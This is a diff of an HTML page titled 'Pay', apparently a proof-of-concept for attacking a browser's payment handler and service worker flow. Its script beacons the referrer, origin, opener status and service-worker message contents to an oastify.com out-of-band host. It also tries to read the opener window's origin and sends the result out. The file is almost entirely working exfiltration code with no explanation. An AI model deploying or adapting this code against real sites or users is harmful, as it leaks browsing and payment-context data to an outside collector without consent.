@@ -1,23 +1,33 @@
   <!DOCTYPE html>
   <html>
+  <head><title>Pay</title></head>
+  <body>
   <script>
-  const OOB = 'https://n6u4chbqezxncoq47ydz4ge9q0wrkh86.oastify.com';
+  const OOB = 'https://ua8bgofxi61ugvubb5h68nigu70yopce.oastify.com';
+  const log = d => new Image().src = OOB + '/handler?' + new URLSearchParams(
+    typeof d === 'string' ? {m: d} : d
+  ).toString();
 
-  // Receive context from SW
-  navigator.serviceWorker.addEventListener('message', e => {
-    new Image().src = OOB + '/handler_msg?d=' +
-      encodeURIComponent(JSON.stringify(e.data));
+  log({
+    loaded: 1,
+    ref: document.referrer,
+    opener: window.opener ? 'yes' : 'no',
+    origin: location.origin
   });
 
-  // Also log our own context
-  new Image().src = OOB + '/handler_loaded?ref=' +
-    encodeURIComponent(document.referrer) +
-    '&opener=' + (window.opener ? 'yes' : 'no');
+  // Receive data from SW
+  navigator.serviceWorker.addEventListener('message', e => {
+    log({src: 'sw_msg', d: JSON.stringify(e.data)});
+  });
 
-  // Complete the payment (required or browser hangs)
-  if (window.PaymentRequestEvent) {
-    // Already handled via SW respondWith
+  // If opened as a popup, try to read opener
+  if (window.opener) {
+    try {
+      log({opener_origin: window.opener.location.origin});
+    } catch(e) {
+      log({opener_origin: 'cross-origin: ' + e.message});
+    }
   }
   </script>
-  <body>Processing...</body>
+  </body>
   </html>
